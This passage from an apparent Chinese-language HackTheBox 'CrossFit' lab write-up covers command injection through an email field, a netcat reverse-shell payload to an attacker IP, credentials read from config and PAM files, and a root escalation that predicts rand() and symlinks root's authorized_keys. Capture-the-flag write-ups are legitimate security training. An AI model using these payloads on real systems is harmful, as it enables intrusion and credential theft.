class="string">&quot;oeLoo~y2baeni&quot;</span></span><br></pre></td></tr></table></figure><p>确实写进入了，而且为了也试了手动插入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (email) <span class="keyword">values</span> (&quot;123@qq.com||touch /tmp/pwn&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210828183233102.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210828183233102.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210828183233102"></p><p>没有成功执行命令</p><p><img src="/img/htb-crossfit/image-20210828184514854.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210828184514854.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210828184514854"></p><p>仔细看了一下源码发现还有个文件遍历，要有文件才能执行下面的逻辑，但是这个 <code>$msg_dir</code> 未知，然后 <code>includes/</code> 目录又没权限，晕…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***************************************************</span></span><br><span class="line"><span class="comment"> * Send email updates to users in the mailing list *</span></span><br><span class="line"><span class="comment"> ***************************************************/</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;vendor/autoload.php&quot;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;includes/functions.php&quot;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;includes/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;includes/config.php&quot;</span>);</span><br><span class="line"><span class="keyword">use</span> <span class="title">mikehaertl</span>\<span class="title">shellcommand</span>\<span class="title">Command</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$fs_iterator</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$msg_dir</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$fs_iterator</span> <span class="keyword">as</span> <span class="variable">$file_info</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file_info</span>-&gt;isFile())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$full_path</span> = <span class="variable">$file_info</span>-&gt;getPathname();</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;query(<span class="string">&#x27;SELECT email FROM users&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$res</span>-&gt;fetch_array(MYSQLI_ASSOC))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$command</span> = <span class="keyword">new</span> Command(<span class="string">&#x27;/usr/bin/mail&#x27;</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;addArg(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;CrossFit Club Newsletter&#x27;</span>, <span class="variable">$escape</span>=<span class="literal">true</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;addArg(<span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$escape</span>=<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable">$msg</span> = file_get_contents(<span class="variable">$full_path</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;setStdIn(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unlink(<span class="variable">$full_path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cleanup();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="寻找高权限FTP用户"><a href="#寻找高权限FTP用户" class="headerlink" title="寻找高权限FTP用户"></a>寻找高权限FTP用户</h4><p>文件路径，或许应该从文件服务入手，如果系统里有更高权限的ftp用户，或许就可以读 <code>includes/</code> 目录的文件或写入文件至 <code>$msg_dir</code> ，然后使命令执行条件满足？</p><p>发现 ftp 也是 laravel，发现 <code>.env</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/ftp/.env</span><br><span class="line"><span class="comment"># DB_USERNAME=ftphosting</span></span><br><span class="line"><span class="comment"># DB_PASSWORD=&#125;2WZk.X;u&#123;L&gt;V</span></span><br></pre></td></tr></table></figure><p>连一下数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uftphosting -p<span class="string">&quot;&#125;2WZk.X;u&#123;L&gt;V&quot;</span></span><br></pre></td></tr></table></figure><p>看了一下 <code>accounts</code> 表开始反思，xss+csrf 利用的ftp 是个web页面，数据是插入数据库的，那我是怎么通过 vsftp 连上去的咧 ？</p><p>看一下 ftp 相关用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ftp:x:108:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span></span><br><span class="line"><span class="comment"># vsftpd:x:1002:1002::/var/vsftpd:/bin/false</span></span><br><span class="line"><span class="comment"># ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin </span></span><br></pre></td></tr></table></figure><p>看一下配置文件，提取一下主要的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /etc/ | grep ftp</span><br><span class="line"><span class="comment"># /etc/ftpusers</span></span><br><span class="line"><span class="comment"># /etc/vsftpd/user_conf/ftpadm</span></span><br><span class="line"><span class="comment"># /etc/pam.d/vsftpd</span></span><br><span class="line"><span class="comment"># /etc/vsftpd.conf</span></span><br></pre></td></tr></table></figure><p>仔细对比了一下，这个 <code>ftpadm</code> 用户是一个真正的系统用户，和我们一开始通过 xss+ccsrf 创建的 ftp 用户有些许不一样（存在数据库里的）</p><p>看下配置文件 <code>/etc/vsftpd.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local_enable=YES</span><br><span class="line">pam_service_name=vsftpd</span><br><span class="line">user_config_dir=/etc/vsftpd/user_conf</span><br></pre></td></tr></table></figure><p>参考vsftpd官方文档<sup><a href="https://security.appspot.com/vsftpd/vsftpd_conf.html">10</a></sup></p><ul><li>local_enable 表示可用 /etc/passwd 里的用户进行登录</li><li>pam_service_name 使用 pam进行认证，对应的文件在 <code>/etc/pam.d/vsftpd</code></li><li>user_config_dir 详细配置特定用户</li></ul><p>看下 pam 目录文件，奇奇怪怪的姿势增加了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/pam.d/vsftpd</span><br></pre></td></tr></table></figure><p>原来还可以通过 <a href="https://github.com/NigelCunningham/pam-MySQL">pam_mysql.so</a> + MariaDB（MySQL） 认证 FTP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">auth sufficient pam_mysql.so user=ftpadm passwd=8W)&#125;gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3</span><br><span class="line">account sufficient pam_mysql.so user=ftpadm passwd=8W)&#125;gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Standard behaviour for ftpd(8).</span></span><br><span class="line">auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Standard pam includes</span></span><br><span class="line">@include common-account</span><br><span class="line">@include common-session</span><br><span class="line">@include common-auth</span><br><span class="line">auth    required        pam_shells.so</span><br></pre></td></tr></table></figure><p>其中配置里的 <code>sufficient</code> 表示当该模块匹配成功后，不会继续匹配其他模块，如果匹配失败了会匹配其他模块。</p><p>也就是说这个 ftpadm 用户是用于连接MariaDB，然后读取其中的 ftphosting.accounts 表的  username 和 pass 字段，来判断我们通过 21 端口登录的用户密码是否正确。如果数据库认证失败了，会通过<code>pam_unix.so</code> 认证系统用户</p><p>然后最后一行 <code>auth required pam_shells.so</code><sup><a href="https://linux.die.net/man/8/pam_shells">[11]</a></sup>，就很关键了，即表示 <code>/etc/shells</code>记录可登入的shell类型，比如常见的有 <code>/bin/zsh</code> <code>/bin/sh</code> <code>/bin/bash</code>，看看 <code>cat /etc/shells</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>震惊，竟然 <code>/usr/sbin/nologin</code> 也是可登录的，然后 <code>ftpadm</code> 用户也刚好是  <code>/usr/sbin/nologin</code> ，数据库的帐号密码刚好知道，<code>user=ftpadm passwd=8W)&#125;gpRJvAmnb</code>，会不会这个用户的密码就是这个咧？</p><p>尝试一下 <code>ftpadm/8W)&#125;gpRJvAmnb</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lftp</span><br><span class="line"><span class="built_in">set</span> ftp:ssl-force <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> ssl:verify-certificate no</span><br><span class="line">connect 10.10.10.208</span><br><span class="line">login tari tari</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210829210857205.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829210857205.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829210857205"></p><p>登录进去了！</p><p>瞎猜一下，这个会不会就是 <code>$msg_dir</code> 的目录呢？</p><p>先上传个文件上去</p><p><img src="/img/htb-crossfit/image-20210829213142040.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829213142040.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829213142040"></p><p>然后邮箱构造为</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=`touch$&#123;IFS&#125;/tmp/pwn`@qq.com</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210829213225006.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829213225006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829213225006"></p><p>命令执行成功</p><p><img src="/img/htb-crossfit/image-20210829213258783.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829213258783.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829213258783"></p><p>反弹个shell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=`nc$&#123;IFS&#125;10.10.14.39$&#123;IFS&#125;2233$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash`@qq.com</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210829225112602.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829225112602.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829225112602"></p><p>顺便确认一下 <code>$msg_dir</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">isaac@crossfit:~/send_updates$ cat includes/config.php</span><br><span class="line">cat includes/config.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$msg_dir</span> = <span class="string">&quot;/srv/ftp/messages&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="权限提升-获取root权限"><a href="#权限提升-获取root权限" class="headerlink" title="权限提升 - 获取root权限"></a>权限提升 - 获取root权限</h3><p>传个 <a href="https://github.com/DominicBreuker/pspy">pspy64</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64 -f</span><br></pre></td></tr></table></figure><p>发现一个 <code>dbmsg</code> 在定期运行，反编译，发现如下代码逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> _Var1;</span><br><span class="line">  <span class="keyword">time_t</span> tVar2;</span><br><span class="line"></span><br><span class="line">  _Var1 = geteuid();</span><br><span class="line">  <span class="keyword">if</span> (_Var1 != <span class="number">0</span>) &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;This program must be run as root.\n&quot;</span>,<span class="number">1</span>,<span class="number">0x22</span>,<span class="built_in">stderr</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  tVar2 = time((<span class="keyword">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  srand((uint)tVar2);</span><br><span class="line">  process_data();</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先发现一个伪随机，然后数据库读操作，且数据库读取 <code>message</code> 表里的内容，然后把前三个字段写入 <code>/var/local/md(时间戳)</code> 路径</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_data</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  <span class="keyword">long</span> lVar3;</span><br><span class="line">  undefined8 uVar4;</span><br><span class="line">  <span class="keyword">size_t</span> sVar5;</span><br><span class="line">  undefined local_f8 [<span class="number">48</span>];</span><br><span class="line">  <span class="keyword">char</span> local_c8 [<span class="number">48</span>];</span><br><span class="line">  <span class="keyword">char</span> local_98 [<span class="number">48</span>];</span><br><span class="line">  undefined local_68 [<span class="number">28</span>];</span><br><span class="line">  undefined4 local_4c;</span><br><span class="line">  <span class="keyword">long</span> local_48;</span><br><span class="line">  FILE *local_40;</span><br><span class="line">  <span class="keyword">long</span> *local_38;</span><br><span class="line">  <span class="keyword">long</span> local_30;</span><br><span class="line">  <span class="keyword">long</span> local_28;</span><br><span class="line">  <span class="keyword">long</span> local_20;</span><br><span class="line"></span><br><span class="line">  local_20 = mysql_init(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (local_20 == <span class="number">0</span>) &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;mysql_init() failed\n&quot;</span>,<span class="number">1</span>,<span class="number">0x14</span>,<span class="built_in">stderr</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  lVar3 = mysql_real_connect(local_20,<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;crossfit&quot;</span>,<span class="string">&quot;oeLoo~y2baeni&quot;</span>,<span class="string">&quot;crossfit&quot;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (lVar3 == <span class="number">0</span>) &#123;</span><br><span class="line">    exit_with_error(local_20);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = mysql_query(local_20,<span class="string">&quot;SELECT * FROM messages&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    exit_with_error(local_20);</span><br><span class="line">  &#125;</span><br><span class="line">  local_28 = mysql_store_result(local_20);</span><br><span class="line">  <span class="keyword">if</span> (local_28 == <span class="number">0</span>) &#123;</span><br><span class="line">    exit_with_error(local_20);</span><br><span class="line">  &#125;</span><br><span class="line">  local_30 = zip_open(<span class="string">&quot;/var/backups/mariadb/comments.zip&quot;</span>,<span class="number">1</span>,&amp;local_4c);</span><br><span class="line">  <span class="keyword">if</span> (local_30 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (local_38 = (<span class="keyword">long</span> *)mysql_fetch_row(local_28), local_38 != (<span class="keyword">long</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((((*local_38 != <span class="number">0</span>) &amp;&amp; (local_38[<span class="number">1</span>] != <span class="number">0</span>)) &amp;&amp; (local_38[<span class="number">2</span>] != <span class="number">0</span>)) &amp;&amp; (local_38[<span class="number">3</span>] != <span class="number">0</span>)) &#123;</span><br><span class="line">        lVar3 = *local_38;</span><br><span class="line">        uVar2 = rand();</span><br><span class="line">        <span class="built_in">snprintf</span>(local_c8,<span class="number">0x30</span>,<span class="string">&quot;%d%s&quot;</span>,(ulong)uVar2,lVar3);</span><br><span class="line">        sVar5 = <span class="built_in">strlen</span>(local_c8);</span><br><span class="line">        md5sum(local_c8,sVar5 &amp; <span class="number">0xffffffff</span>,local_f8);</span><br><span class="line">        <span class="built_in">snprintf</span>(local_98,<span class="number">0x30</span>,<span class="string">&quot;%s%s&quot;</span>,<span class="string">&quot;/var/local/&quot;</span>,local_f8);</span><br><span class="line">        local_40 = fopen(local_98,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (local_40 != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          <span class="built_in">fputs</span>((<span class="keyword">char</span> *)local_38[<span class="number">1</span>],local_40);</span><br><span class="line">          fputc(<span class="number">0x20</span>,local_40);</span><br><span class="line">          <span class="built_in">fputs</span>((<span class="keyword">char</span> *)local_38[<span class="number">3</span>],local_40);</span><br><span class="line">          fputc(<span class="number">0x20</span>,local_40);</span><br><span class="line">          <span class="built_in">fputs</span>((<span class="keyword">char</span> *)local_38[<span class="number">2</span>],local_40);</span><br><span class="line">          fclose(local_40);</span><br><span class="line">          <span class="keyword">if</span> (local_30 != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Adding file %s\n&quot;</span>,local_98);</span><br><span class="line">            local_48 = zip_source_file(local_30,local_98,<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (local_48 == <span class="number">0</span>) &#123;</span><br><span class="line">              uVar4 = zip_strerror(local_30);</span><br><span class="line">              <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,uVar4);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              lVar3 = zip_file_add(local_30,local_f8,local_48);</span><br><span class="line">              <span class="keyword">if</span> (lVar3 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                zip_source_free(local_48);</span><br><span class="line">                uVar4 = zip_strerror(local_30);</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,uVar4);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> &#123;</span><br><span class="line">                uVar4 = zip_strerror(local_30);</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,uVar4);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_free_result(local_28);</span><br><span class="line">    delete_rows(local_20);</span><br><span class="line">    mysql_close(local_20);</span><br><span class="line">    <span class="keyword">if</span> (local_30 != <span class="number">0</span>) &#123;</span><br><span class="line">      zip_close(local_30);</span><br><span class="line">    &#125;</span><br><span class="line">    delete_files();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  zip_error_init_with_code(local_68,local_4c);</span><br><span class="line">  uVar4 = zip_error_strerror(local_68);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,uVar4);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为随机数为伪随机，用的标准库函数，我们如果也用C，在目标机器上执行，跟着一起执行，在相同时间生成的就是一样的。</p><p>这里写入的文件内容刚好为3个字段，我们可控，因  <code>dbmsg</code>  是root运行，我们可以写ssh认证公钥进去。因软连接是没有权限限制，只要我们执行了，他就会链接，那么我们可控的内容就可以写入免认证文件里了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./exploit)1 | md5sum | cut -d &quot; &quot; -f 1)</span><br></pre></td></tr></table></figure><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="1、HTTP服务可以看到管理员来获取payload2-js，但nc就是接收不到数据，一接收立刻断开"><a href="#1、HTTP服务可以看到管理员来获取payload2-js，但nc就是接收不到数据，一接收立刻断开" class="headerlink" title="1、HTTP服务可以看到管理员来获取payload2.js，但nc就是接收不到数据，一接收立刻断开"></a>1、HTTP服务可以看到管理员来获取payload2.js，但nc就是接收不到数据，一接收立刻断开</h3><p>构造以下payload请求链接 <a href="http://ftp.crossfit.htb/accounts/create%EF%BC%8C%E4%BF%9D%E5%AD%98%E4%BB%A5%E4%B8%8Bpayload%E4%B8%BApayload2.js%EF%BC%88%E4%B8%8B%E9%9D%A2">http://ftp.crossfit.htb/accounts/create，保存以下payload为payload2.js（下面</a> IP 变为 10.10.14.4 是因为openvpn断了，所以我本机IP变了）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span 